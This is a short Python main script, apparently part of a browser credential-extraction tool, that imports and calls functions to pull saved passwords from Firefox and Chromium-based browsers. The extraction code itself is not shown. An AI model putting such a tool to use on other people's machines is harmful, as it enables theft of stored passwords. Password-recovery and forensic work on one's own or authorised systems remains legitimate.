from chromium_utils import extract_passwords as chrome_pass
from firefox_utils import extract_passwords as firefox_pass
import utils

if __name__ == "__main__":
    utils.set_platform()
    firefox_pass()
    chrome_pass()